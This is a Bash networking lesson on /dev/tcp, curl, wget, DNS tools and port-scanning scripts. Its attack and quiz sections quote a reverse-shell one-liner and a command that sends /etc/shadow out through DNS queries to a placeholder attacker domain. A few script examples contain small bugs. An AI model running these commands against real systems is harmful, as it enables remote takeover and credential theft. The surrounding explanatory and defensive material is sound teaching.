# Lesson 16: Networking with Bash

## History & Origins

Bash's `/dev/tcp` feature is part of the shell's built-in redirection system, dating back to bash 2.04 (2000). It was added by Chet Ramey, the bash maintainer, as a compile-time option (`--enable-net-redirections`). It's NOT a file in the filesystem — it's an INTERNAL bash feature that implements TCP connections using sockets.

When you write `exec 3<>/dev/tcp/host/port`, bash intercepts the special path, parses out the host and port, and calls `socket()`, `connect()`, and `dup2()` internally. The file descriptor behaves like a regular socket FD.

This feature is controversial:
- **Pro:** Pure bash networking with zero external dependencies. Works in minimal environments (containers, initramfs, embedded).
- **Con:** Not portable to other shells (dash, zsh, fish). May not be compiled in. Inefficient for real network programming.

Before `/dev/tcp`, shell scripts used external tools:
- **nc (netcat):** The "TCP/IP Swiss Army knife" — written in 1995 by Hobbit
- **curl (1997):** Daniel Stenberg's HTTP tool — became the universal data transfer tool
- **wget (1996):** Hrvoje Niksic's download tool — simpler than curl for downloads

For production scripts, `curl` and `wget` are almost always better choices than `/dev/tcp`. They handle HTTP protocol (redirects, cookies, headers, SSL), timeout properly, and provide structured exit codes.

But `/dev/tcp` excels for:
- Quick health checks (is port XX open?)
- Raw protocol testing (send exact bytes, read exact response)
- Minimal environments where curl/wget aren't installed

## Syntax Reference

```
# /dev/tcp and /dev/udp (bash built-in, if compiled in)
exec 3<>/dev/tcp/host/port        # Open TCP connection on FD 3 (read+write)
exec 3</dev/tcp/host/port         # Open TCP for reading only
exec 3>/dev/tcp/host/port         # Open TCP for writing only
exec 3<>/dev/udp/host/port        # Open UDP connection
printf "GET / HTTP/1.0\r\n\r\n" >&3   # Write to FD 3
read -r line <&3                      # Read line from FD 3
cat <&3                               # Read all from FD 3
exec 3<&-                             # Close FD 3 (close input side)

# Check if /dev/tcp is available
enable -p | grep /dev/tcp         # Show if compiled in
(command exec 3<>/dev/tcp/example.com/80) 2>/dev/null && echo "available" || echo "unavailable"

# Curl
curl -s -o /dev/null -w '%{http_code}' URL              # Get HTTP status code
curl -s -o /dev/null -w '%{http_code}\t%{time_total}\t%{size_download}' URL
curl -s -o file --connect-timeout 5 --max-time 10 URL    # Download with timeouts
curl -X POST -H "Content-Type: application/json" -d '{"key":"val"}' URL
curl -k --cert cert.pem --key key.pem https://secure/    # SSL client cert
curl -L URL                                               # Follow redirects
curl -v URL                                               # Verbose (debug)

# Wget
wget -q -O - URL                                          # Download to stdout
wget -q -O file --timeout=10 URL                          # Download with timeout
wget --retry-connrefused --tries=5 --wait=2 URL           # Retry with backoff
wget -q --post-data="key=val" URL                         # POST request

# DNS
host hostname                    # DNS lookup
nslookup hostname                # DNS lookup (older)
dig +short hostname              # DNS lookup (modern)
getent hosts hostname            # System resolver
hostname -I                      # Local IP addresses

# Connection monitoring
ss -tlnp4                        # TCP listening, numeric, PIDs
ss -tunap                        # All TCP/UDP connections with PIDs
ss -tnp state ESTABLISHED        # Established connections only
lsof -i -P -n                    # All network FDs (no port name, no host resolve)
nc -z -w 3 host port             # TCP port check (netcat)
nmap -sT -p 1-1000 host          # Port scan (nmap)
timeout 1 bash -c 'exec 3<>/dev/tcp/host/port' 2>/dev/null && echo "OPEN" || echo "CLOSED"

# Network troubleshooting
ping -c 3 host                   # ICMP echo
traceroute host                  # Route tracing
mtr host                         # Continuous traceroute
curl -o /dev/null -s -w '%{time_namelookup}:%{time_connect}:%{time_starttransfer}:%{time_total}\n' URL
```

## Under the Hood (GO DEEP)

### /dev/tcp: Bash Internals

When bash encounters a redirection like `/dev/tcp/host/port`, here's what happens internally (simplified from bash source code `redir.c`):

1. Bash parses the path. If it matches the pattern `/dev/tcp/HOST/PORT`, it extracts HOST and PORT.
2. Bash calls `getaddrinfo(HOST, PORT, ...)` to resolve the hostname and get a sockaddr structure.
3. Bash calls `socket(AF_INET, SOCK_STREAM, 0)` to create a TCP socket.
4. Bash calls `connect(fd, addr, addrlen)` to connect to the remote host.
5. Bash calls `dup2(fd, n)` where `n` is the redirection file descriptor number.
6. For `exec 3<>/dev/tcp/host/port`, the socket is opened for both reading and writing.

The `/dev/tcp` prefix is just a string pattern — there's NO actual filesystem access. The paths `/dev/tcp`, `/dev/udp` don't exist in the filesystem. They're entirely bash internal.

**Key difference:** `exec 3<>/dev/tcp/host/port` opens a socket. `exec 3<>/dev/tcp/host/port` with the DIAMOND OPERATOR `<>` opens for both reading and writing. This is what makes HTTP requests possible — you write the request, then read the response.

### Why /dev/tcp is Slow for Port Scanning

Each connection attempt using `/dev/tcp` involves:
1. A full TCP three-way handshake (SYN, SYN-ACK, ACK)
2. Either connection succeeds or timeout expires
3. Socket is closed (FIN or RST)

Bash does this SERIALLY — one port at a time. On a LAN, this takes ~1ms per port (if open) or ~1-3 seconds per port (if closed with timeout). Scanning 65535 ports at 1 second each = 18 hours!

In contrast, `nmap` uses:
- Raw packets (no full handshake for SYN scan)
- Parallel scanning (hundreds of ports simultaneously)
- Adaptive timing (faster on responsive hosts, slower on lossy ones)
- OS fingerprinting, service detection, version detection

### Timeout Mechanics

When you use `timeout 3 bash -c 'exec 3<>/dev/tcp/$host/$port'`, here's what happens:

1. The shell forks: parent is `timeout`, child is `bash -c '...'`
2. `timeout` sets an alarm and calls `waitpid()`
3. `bash` calls `connect()` which blocks waiting for the TCP handshake
4. If the port is filtered (firewall drops SYN), `connect()` blocks for the default TCP timeout (~127 seconds or `tcp_syn_retries` dependent)
5. After 3 seconds, `timeout` sends SIGTERM to the bash child
6. `bash` dies, `waitpid()` returns, `timeout` exits with code 124

Without `timeout`, a blocked `connect()` takes minutes to fail. This is why `/dev/tcp` is unusable without `timeout` for scanning.

### Network Security Considerations

**SELinux and Socket Access:** SELinux policies control which domains can create network sockets. A confined service (like `httpd_t`) may NOT be allowed to create outbound connections. `/dev/tcp` is still subject to these restrictions.

**Containerized Environments:** In Docker containers, outbound TCP is usually unrestricted (unless the container is run with `--network none`). But inbound connections are limited to exposed ports.

**Firewall Interactions:** `/dev/tcp` connects through the firewall like any other process. If `iptables` blocks outbound connections to port 25 (SMTP), `/dev/tcp` also fails.

### What strace Reveals

```bash
# /dev/tcp connection:
$ strace -f bash -c 'exec 3<>/dev/tcp/example.com/80; printf "GET /\r\n\r\n" >&3; cat <&3'
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
setsockopt(3, SOL_TCP, TCP_NODELAY, [1], 4) = 0
connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("93.184.216.34")}, 16) = 0
dup2(3, 3)                              = 3
write(3, "GET /\r\n\r\n", 8)           = 8
read(3, "HTTP/1.0 200 OK\r\nContent-Type: text/html\r\n...", 8192) = 1256

# Curl invocation:
$ strace -e connect,read write curl -s http://example.com
connect(3, {sa_family=AF_INET, sin_port=htons(80), ...}, 16) = 0
read(3, "HTTP/1.1 200 OK\r\n...", 102400) = 1256

# DNS resolution:
$ strace -e connect,sendto getent hosts example.com
socket(AF_INET, SOCK_DGRAM|SOCK_CLOEXEC, IPPROTO_UDP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(53)}, 16) = 0
sendto(3, "\x12\x34\x01\x00\x00\x01...", 33, 0, NULL, 0) = 33
```

### Process/Memory Implications

- `/dev/tcp` connections are process-bound. Bash process holds the connection open.
- Each open FD consumes kernel memory (~1KB for socket struct) and a port in the ephemeral range.
- Bash is single-threaded — one connection at a time. For parallel connections, use background jobs.
- curl/wget are C programs optimized for network I/O — they use non-blocking sockets, select/poll, and connection reuse.

## Core Examples (15 total)

### Example 1: Basic TCP client with /dev/tcp

```bash
$ exec 3<>/dev/tcp/example.com/80
$ printf "GET / HTTP/1.0\r\nHost: example.com\r\n\r\n" >&3
$ cat <&3
$ exec 3<&-
```

**Output:**
```
HTTP/1.0 200 OK
Content-Type: text/html
...
```

**Anatomy:** Opens FD 3 for read+write to example.com:80. Writes HTTP GET request. Reads response. Closes FD. The `exec 3<&-` closes the input side (which also closes the connection).

**Variations:** Use `printf "HEAD / HTTP/1.0\r\n\r\n" >&3` for HEAD request. Use `read -r status <&3` to read just the status line.

**Edge case:** If `/dev/tcp` is not compiled into bash, you'll get "No such file or directory" error. Check with `enable | grep /dev`.

### Example 2: Timeout for network operations

```bash
$ timeout 5 bash -c 'exec 3<>/dev/tcp/10.0.0.1/80; printf "GET / HTTP/1.0\r\n\r\n" >&3; cat <&3'
$ echo $?
124
```

**Anatomy:** `timeout 5` kills the command if it takes more than 5 seconds. Exit code 124 means timeout was triggered.

**Variations:** `timeout -s KILL 3` sends SIGKILL (not SIGTERM) on timeout. Use for stubborn connections.

**Edge case:** The `timeout` command wraps the ENTIRE bash script. If the connection succeeds and data transfer takes a long time, the timeout kills mid-read. Use `--max-time` with curl instead for finer control.

### Example 3: HTTP status checker with curl

```bash
$ cat > http_status.sh << 'EOF'
check_url() {
  local url="$1" expected_code="${2:-200}"
  local code=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 "$url" 2>/dev/null)
  if [ "$code" = "$expected_code" ]; then
    echo "OK  $url -> $code"
  elif [ -z "$code" ]; then
    echo "FAIL $url -> (connection error)"
  else
    echo "MISMATCH $url -> $code (expected $expected_code)"
  fi
}

check_url "https://google.com"
check_url "https://example.com/notfound" 404
check_url "https://nonexistent.example.com"
EOF
$ bash http_status.sh
```

**Output:**
```
OK  https://google.com -> 200
OK  https://example.com/notfound -> 404
FAIL https://nonexistent.example.com -> (connection error)
```

**Anatomy:** curl's `-w` format string outputs only the HTTP code. `-o /dev/null` discards the body. `--connect-timeout 5` and `--max-time 10` prevent hangs.

**Variations:** Add timing: `-w '%{http_code} %{time_total}s %{size_download}bytes'`. Add JSON output: `curl -s -o /dev/null -w '{"url":"%{url}","code":%{http_code},"time":%{time_total}}'`.

### Example 4: Port scanner with /dev/tcp (sequential)

```bash
$ cat > port_scan.sh << 'EOF'
HOST="$1"
PORTS=(22 80 443 8080 8443)
for port in "${PORTS[@]}"; do
  timeout 1 bash -c "exec 3<>/dev/tcp/$HOST/$port" 2>/dev/null && \
    echo "Port $port: OPEN" || echo "Port $port: CLOSED"
done
EOF
$ bash port_scan.sh scanme.org
```

**Output:**
```
Port 22: OPEN
Port 80: CLOSED
Port 443: CLOSED
Port 8080: OPEN
Port 8443: CLOSED
```

**Anatomy:** `timeout 1` gives each port 1 second to connect. `exec 3<>` tries the connection. If it succeeds (exit 0), port is OPEN. If timeout or connection refused, port is CLOSED.

**Variations:** Add progress bar. Add service detection by reading banners.

**Edge case:** Connection refused (ECONNREFUSED) and timeout (no response) both show as CLOSED. To distinguish, check the error: `2>&1` shows "Connection refused" for truly closed ports vs. timeout for filtered ports.

### Example 5: Concurrent port scanner (background jobs)

```bash
$ cat > fast_port_scan.sh << 'EOF'
HOST="$1"; START="${2:-1}"; END="${3:-1024}"
scan_port() {
  local port="$1"
  timeout 1 bash -c "exec 3<>/dev/tcp/$HOST/$port" 2>/dev/null && echo "OPEN: $port"
}
for port in $(seq "$START" "$END"); do
  scan_port "$port" &
done
wait
EOF
$ time bash fast_port_scan.sh scanme.org 1-1000
```

**Anatomy:** Background jobs (`&`) run up to 1000 concurrent connections. `wait` ensures all finish before the script exits. This is MUCH faster than sequential (1000 ports in ~3-5 seconds vs. 1000 seconds).

**Variations:** Limit concurrency with a job control pool: run N at a time, wait for one to finish before starting the next.

**Edge case:** 1000 concurrent connections can overwhelm your system (ephemeral port exhaustion, socket buffer memory). Limit to 100-200 concurrent.

### Example 6: HTTP request with /dev/tcp and response parsing

```bash
$ exec 3<>/dev/tcp/example.com/80
$ printf "GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n" >&3
$ read -r status_line <&3
$ echo "Status: $status_line"
$ while IFS= read -r header; do
    [ -z "$header" ] && break
    echo "Header: $header"
  done <&3
$ body=$(cat <&3)
$ echo "Body length: ${#body} bytes"
$ exec 3<&-
```

**Output:**
```
Status: HTTP/1.1 200 OK
Header: Content-Type: text/html
Header: Content-Length: 1256
...
Body length: 1256 bytes
```

**Anatomy:** `read -r status_line` reads the first line. The `while read` loop reads headers, breaking on empty line (header/body separator). The remaining data is the body.

**Variations:** Parse `Content-Length` from headers. Handle chunked transfer encoding (look for Transfer-Encoding: chunked).

**Edge case:** HTTP/1.1 without `Connection: close` keeps the connection alive. The server won't close after the response. Without `Content-Length` or chunked encoding, `cat` blocks indefinitely reading the body.

### Example 7: Reliable download with retry logic

```bash
$ cat > reliable_fetch.sh << 'EOF'
fetch_url() {
  local url="$1" output="${2:-/dev/null}" max_retries="${3:-3}"
  local retry=0
  while [ "$retry" -lt "$max_retries" ]; do
    if wget -q -O "$output" --timeout=30 "$url" 2>/dev/null; then
      echo "Downloaded: $url (attempt $((retry+1)))"
      return 0
    fi
    retry=$((retry + 1))
    echo "Retry $retry/$max_retries for $url" >&2
    sleep $((retry * 2))  # Exponential backoff
  done
  echo "FAILED: $url after $max_retries attempts" >&2
  return 1
}

fetch_url "https://example.com/file.zip" "/tmp/file.zip" 5
EOF
```

**Anatomy:** Retries up to `max_retries` times with exponential backoff (2s, 4s, 6s...). Logs each attempt. Returns 0 on success, 1 on failure.

**Variations:** Add jitter: `sleep $(( (RANDOM % retry + retry) * 2))`. Check HTTP status code and only retry on 5xx (server errors), not 4xx (client errors).

**Edge case:** Wget returns exit code 8 for server errors (5xx) and 4 for network failures. The script retries both. Adjust logic to not retry 4xx errors.

### Example 8: UDP DNS query

```bash
$ timeout 2 bash -c 'exec 3<>/dev/udp/8.8.8.8/53; printf "\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01" >&3; cat <&3' | xxd
```

**Output:**
```
00000000: 0001 8180 0001 0001 0000 0000 0377 7777  .............www
00000010: 0667 6f6f 676c 6503 636f 6d00 0001 0001  .google.com.....
00000020: c00c 0001 0001 0000 0005 0004 4a7d 5d0c  ............J=].
```

**Anatomy:** Sends a raw DNS query packet (hex-encoded) to Google's DNS via UDP. `xxd` decodes the binary response. The response contains the IP address (4a7d5d0c = 74.125.93.12).

**Variations:** Use `dig +short` instead — much simpler and handles all DNS query types.

**Edge case:** `/dev/udp` may not be compiled in the same way as `/dev/tcp`. UDP does not have a connection handshake — data may be lost without notice.

### Example 9: Network interface monitoring

```bash
$ cat > net_monitor.sh << 'EOF'
get_net_stats() {
  local iface="$1"
  awk -v iface="$iface:" '$1 == iface {printf "RX: %d bytes, TX: %d bytes", $2, $10}' /proc/net/dev
}

while true; do
  clear
  echo "=== Network Monitor ==="
  echo "$(date)"
  for iface in /sys/class/net/*; do
    name=$(basename "$iface")
    [ "$name" = "lo" ] && continue
    echo "$name: $(get_net_stats "$name")"
  done
  sleep 1
done
EOF
```

**Anatomy:** Reads `/proc/net/dev` which contains packet/byte counts for each interface. Calculates and displays RX/TX rates.

**Variations:** Calculate bandwidth by sampling twice with a sleep interval and computing delta.

**Edge case:** `/proc/net/dev` counters wrap around at 2^32 or 2^64 depending on architecture. Handle wrap-around by detecting counter decrease.

### Example 10: SSL/TLS with /dev/tcp (via openssl s_client)

```bash
$ cat > https_fetch.sh << 'EOF'
https_get() {
  local host="$1" path="${2:-/}"
  # OpenSSL handles the TLS handshake, then /dev/tcp is used for... actually we use openssl throughout
  echo -e "GET $path HTTP/1.1\r\nHost: $host\r\nConnection: close\r\n\r\n" | \
    openssl s_client -quiet -connect "$host:443" 2>/dev/null
}

https_get "example.com" "/"
EOF
```

**Anatomy:** `openssl s_client` establishes a TLS connection to the host:port, then passes stdin to the socket and stdout receives from it. The HTTP request is piped to openssl.

**Variations:** `openssl s_client -servername "$host"` for SNI (required for modern HTTPS). `-verify_return_error` for certificate verification.

**Edge case:** `/dev/tcp` cannot do TLS natively. For HTTPS, you MUST use curl, wget, or openssl s_client. There's no bash-native way to encrypt a socket.

### Example 11: Bandwidth test (speed test)

```bash
$ cat > bandwidth_test.sh << 'EOF'
URL="${1:-https://proof.ovh.net/files/100Mb.dat}"
START=$(date +%s.%N)
curl -s -o /dev/null --connect-timeout 10 --max-time 30 "$URL"
END=$(date +%s.%N)
ELAPSED=$(echo "$END - $START" | bc -l)
SIZE=$(curl -s -o /dev/null -w '%{size_download}' --connect-timeout 10 --max-time 30 "$URL")
SPEED=$(echo "$SIZE / $ELAPSED / 1024 / 1024 * 8" | bc -l)
printf "Downloaded %d bytes in %.2fs (%.2f Mbps)\n" "$SIZE" "$ELAPSED" "$SPEED"
EOF
```

**Anatomy:** Downloads a test file, measures time with sub-second precision (`%N` for nanoseconds), calculates speed in Mbps.

**Variations:** Use multiple parallel connections to test aggregate bandwidth.

**Edge case:** `date +%s.%N` gives nanosecond precision but `bc -l` is needed for floating-point math. Without bc, use integer microseconds: `date +%s%6N`.

### Example 12: TCP port checker (service detection)

```bash
$ cat > service_check.sh << 'EOF'
check_service() {
  local host="$1" port="$2"
  local banner
  banner=$(timeout 3 bash -c "exec 3<>/dev/tcp/$host/$port; read -r -t 2 banner <&3; echo \"\$banner\"" 2>/dev/null)
  if [ -n "$banner" ]; then
    echo "Port $port: $banner"
  elif [ $? -eq 0 ]; then
    echo "Port $port: OPEN (no banner)"
  else
    echo "Port $port: CLOSED/TIMEOUT"
  fi
}

check_service "example.com" 22
check_service "example.com" 80
EOF
```

**Output:**
```
Port 22: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
Port 80: HTTP/1.1 200 OK
```

**Anatomy:** Connects to the port and reads any banner (many services send a greeting on connect). SSH sends version string. HTTP sends status on first request.

**Variations:** For HTTP, send a basic GET first. For SMTP, wait for the 220 greeting.

**Edge case:** Some services don't send banners until you send data. Some have delayed banners. Read with `-t` timeout to avoid hanging.

### Example 13: HTTP health check with /dev/tcp

```bash
$ cat > health_check.sh << 'EOF'
health_check() {
  local host="$1" port="${2:-80}" path="${3:-/}"
  exec 3<>/dev/tcp/$host/$port || return 1
  printf "GET %s HTTP/1.0\r\nHost: %s\r\n\r\n" "$path" "$host" >&3
  read -r status <&3
  echo "$status"
  if echo "$status" | grep -q "200"; then
    exec 3<&-
    return 0
  fi
  exec 3<&-
  return 1
}

health_check "example.com" 80 "/" && echo "HEALTHY" || echo "UNHEALTHY"
```

**Anatomy:** Connects to host:port, sends HTTP GET, reads the status line. Returns 0 if 200 OK, 1 otherwise. Uses HTTP/1.0 (which implies Connection: close) for simplicity.

**Variations:** Use HTTP/1.1 for keepalive. Check response body for expected content. Time the response.

**Edge case:** This blocks if the server doesn't respond. Always wrap with `timeout`.

### Example 14: DNS resolution timing

```bash
$ cat > dns_perf.sh << 'EOF'
measure_dns() {
  local host="$1" dns="${2:-8.8.8.8}"
  local start=$(date +%s%N)
  dig +short "$host" @"$dns" >/dev/null 2>&1
  local elapsed=$(( ($(date +%s%N) - start) / 1000000 ))
  echo "$host via $dns: ${elapsed}ms"
}

measure_dns "google.com"
measure_dns "google.com" "1.1.1.1"
measure_dns "nonexistent-super-long-hostname-that-will-fail.example.com"
EOF
```

**Output:**
```
google.com via 8.8.8.8: 12ms
google.com via 1.1.1.1: 8ms
nonexistent...example.com via 8.8.8.8: 2344ms
```

**Anatomy:** Times DNS resolution using nanosecond-precision timestamps before and after `dig`. Failed lookups take longer (timeout waiting for NXDOMAIN).

**Variations:** Use `getent hosts` for system resolver timing. Test DNSSEC with `dig +dnssec`.

### Example 15: Netcat-style listening (with nc, not bash)

```bash
$ # Listen on a port (requires nc or ncat)
$ nc -l -p 8080 -c 'echo "HTTP/1.1 200 OK\r\nContent-Length: 12\r\n\r\nHello World"'
$ # Or with ncat (nmap.org):
$ ncat -l -p 8080 --sh-exec "echo 'HTTP/1.1 200 OK\r\n\r\nHello World'"
```

**Anatomy:** `nc -l -p` listens for a single connection. `-c` specifies a command to run for each connection. This is a minimal HTTP server.

**Important note:** Bash's `/dev/tcp` is CLIENT-ONLY. You cannot LISTEN with it. For listening, you need `nc -l`, `socat`, or a proper server.

**Variations:** `socat TCP-LISTEN:8080,reuseaddr,fork EXEC:/usr/local/bin/handler.sh` for a proper multi-connection handler.

**Edge case:** `nc` implementations vary. OpenBSD netcat uses `-k` for keep-listening. Traditional netcat exits after one connection.

## Real-World Use Cases

### FOR the OS

- curl/wget for package downloads (APT, yum, pip)
- NetworkManager uses D-Bus for network state changes
- DNS resolution via getent/host/dig for service discovery
- Health checks in monitoring systems (Nagios, Icinga, Zabbix)

### WITH the OS

- **Quick port checks:** "Is port 80 open on this host?" without nmap
- **API calls from scripts:** Trigger webhooks, check CI build status, send Slack alerts
- **Health monitoring:** Poll HTTP endpoints, check response codes
- **Remote command execution:** Over SSH (not raw TCP — use SSH for security)
- **File download/upload:** curl for REST APIs, wget for static files

### AGAINST THE OS

- **Reverse shells:** `bash -i >& /dev/tcp/attacker/4444 0>&1` — classic pivoting
- **Data exfiltration:** curl/wget to upload stolen data to attacker-controlled servers
- **C2 communication:** Periodic beaconing via HTTP/HTTPS to command-and-control
- **Lateral movement:** Port scanning from compromised hosts to find next targets

### FOR DEFENSE

- **Monitor outbound connections:** `ss -tupn | grep ESTAB | grep -v 127.0.0.1` — spot reverse shells
- **Allowlist egress:** Restrict outbound connections with firewall to only necessary services
- **Disable /dev/tcp:** Recompile bash without `--enable-net-redirections` if not needed
- **Use iptables/nftables:** Block unexpected outbound connections per-user
- **Monitor curl/wget usage:** `auditctl -a exit,always -S execve -F exe=/usr/bin/curl -F exe=/usr/bin/wget`

## Memory Aids

**"TCP = WRITE, READ, CLOSE"** — The three-step pattern:
1. **WRITE** your request: `printf "GET ..." >&3`
2. **READ** the response: `cat <&3`
3. **CLOSE** the FD: `exec 3<&-`

**"CURL FOR REAL, TCP FOR QUICK"** — Tool choice:
- **curl/wget** for real production scripts (SSL, redirects, cookies, error handling, performance)
- **/dev/tcp** for quick checks (is port open? send raw bytes?)

**"TIMEOUT OR HANG"** — If you use `/dev/tcp` without `timeout`, your script WILL hang when the remote is unreachable. Always wrap in `timeout`.

**"CLIENT ONLY"** — `/dev/tcp` is client-only. You cannot listen for connections. Use `nc -l` or `socat` for servers.

## Trap Vault (15 traps)

**Trap 1:** `/dev/tcp` may not be compiled into bash. It's a compile-time option. Check with `enable -p | grep /dev`. If unavailable, use `curl` or `wget`.

**Trap 2:** `/dev/tcp` connections BLOCK. Without `timeout`, a connection to an unreachable host (firewall drops SYN) blocks for the TCP retransmission timeout: 127 seconds (or more). Always use `timeout`.

**Trap 3:** Reading from `/dev/tcp` with `cat <&3` blocks until the connection closes. If the server doesn't close the connection (HTTP/1.1 keepalive), `cat` hangs forever. Use `read -r` or `dd` with a count.

**Trap 4:** Bash port scanning is EXTREMELY slow without background jobs. Sequential scanning of 65535 ports with 1s timeout = 18 hours. Use nmap instead.

**Trap 5:** `/dev/tcp` resolves hostnames via the system resolver (blocking). If DNS is slow, the connection attempt is slow even before TCP starts. Use IP addresses directly for faster scanning.

**Trap 6:** HTTP/1.1 requests without `Connection: close` leave the connection open. The server waits for further requests. Your script hangs on `cat <&3` because the server hasn't closed. Always include `Connection: close` in GET requests when using /dev/tcp.

**Trap 7:** `/dev/tcp` does NOT support TLS/SSL. You cannot connect to HTTPS using `/dev/tcp` for the encryption layer. Use `curl` or `openssl s_client`.

**Trap 8:** UDP with `/dev/udp` is even trickier than TCP. There's no connection guarantee. You send data and hope it arrives. Use proper DNS tools (dig/host) instead of raw UDP.

**Trap 9:** The `timeout` command sends SIGTERM by default. A backgrounded bash process may not terminate immediately (it needs to wait for the blocking connect() to be interrupted). Use `timeout -s KILL` for definitiveness.

**Trap 10:** File descriptors 0, 1, 2 are stdin, stdout, stderr. Using `exec 3<>...` uses FD 3. If you have loops or subprocesses, they inherit the FD. Close explicit FDs when done.

**Trap 11:** Background jobs with `/dev/tcp` can leave stale connections if not properly killed. Always track PIDs and clean up: `kill $pid 2>/dev/null; wait $pid 2>/dev/null`.

**Trap 12:** `lsof -i` might not show `/dev/tcp` connections because the socket is opened by bash internally without a visible file descriptor name. Use `ss -tnp` instead — it shows the PID.

**Trap 13:** Some servers implement rate limiting. A bash port scanner with 200 background jobs hitting the same host looks like a DoS attack. The host may block your IP.

**Trap 14:** `curl` and `wget` config files (`~/.curlrc`, `~/.wgetrc`) can modify behavior. On shared systems, check these files for proxy settings that might surprise you.

**Trap 15:** IPv6 is handled differently by `/dev/tcp`. `exec 3<>/dev/tcp/ipv6.google.com/80` connects via IPv6. If your network doesn't have IPv6, you may get "Network is unreachable." Force IPv4 by using an IPv4 address.

## See It In The Wild

- **Reverse shell one-liner:** `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` — used by pentesters and malware authors to get interactive shell access on compromised systems.

- **Health check scripts:** Almost every web infrastructure uses curl for health checks. HAProxy, Nginx, Kubernetes liveness/readiness probes all use HTTP health checking.

- **API automation:** Companies use curl in CI/CD pipelines for API interactions: GitHub releases, Slack notifications, Jira ticket creation, PagerDuty alerts.

- **Exfiltration over DNS:** Attackers use `dig` to exfiltrate data: `dig $(base64 -w0 /etc/shadow).attacker.com`. The DNS query contains the data.

- **C2 beaconing:** Many botnets use HTTP/HTTPS beaconing with wget or curl. The beacon polls a C2 server for commands and exfiltrates data.

- **Network diagnostics:** System administrators use curl and /dev/tcp for quick network troubleshooting without installing additional tools.

## Check Your Understanding (10 questions)

1. **Q:** How does `/dev/tcp/example.com/80` work internally? Is it a real filesystem path? **A:** It's a bash internal, not a filesystem path. Bash parses the pattern, calls `getaddrinfo()` for DNS, `socket()` for creation, `connect()` for the TCP handshake, and `dup2()` to wire it to the file descriptor.

2. **Q:** Why is `/dev/tcp` port scanning slower than `nmap`? **A:** nmap uses raw packets (SYN scan = half-open, no full handshake), sends packets in parallel, and uses adaptive timing. `/dev/tcp` does a full TCP handshake serially.

3. **Q:** How does `timeout` prevent the script from hanging? **A:** `timeout 5 command` runs the command, sends SIGTERM after 5 seconds if still running, and exits with code 124. This prevents the script from hanging on a blocked `connect()`.

4. **Q:** What is the difference between HTTP/1.0 and HTTP/1.1 in raw requests? **A:** HTTP/1.0 closes the connection after each request (server sends FIN). HTTP/1.1 keeps the connection alive by default, requiring `Connection: close` header or explicit Content-Length to know when the response ends.

5. **Q:** Why should background jobs use `wait` for synchronization? **A:** `wait` ensures all background jobs complete before the script exits. Without it, the script exits immediately, killing all background processes (SIGHUP).

6. **Q:** How would you detect that `/dev/tcp` is unavailable at compile time? **A:** `enable -p | grep /dev` shows if it's enabled. Or try `(exec 3<>/dev/tcp/example.com/80) 2>/dev/null` and check the exit code.

7. **Q:** Why can't `/dev/tcp` be used for HTTPS? **A:** HTTPS requires TLS/SSL encryption, which is done at the application layer, not the transport layer. Bash's `/dev/tcp` only provides a raw TCP socket with no encryption.

8. **Q:** How does background job parallelism speed up port scanning? **A:** Multiple connection attempts happen simultaneously. While one connection is waiting for the TCP handshake (network latency), another is already being attempted. With 200 parallel jobs, throughput is ~200x faster.

9. **Q:** What does `exec 3<&-` do, and why is it important? **A:** It closes the input side of FD 3. This also closes the TCP connection. Without it, the FD stays open until the process exits, potentially leaking file descriptors.

10. **Q:** How can `/dev/tcp` be used for a reverse shell? **A:** `bash -i >& /dev/tcp/attacker/4444 0>&1` connects bash's stdin and stdout to a TCP socket. The attacker's nc listener at port 4444 gets an interactive shell.
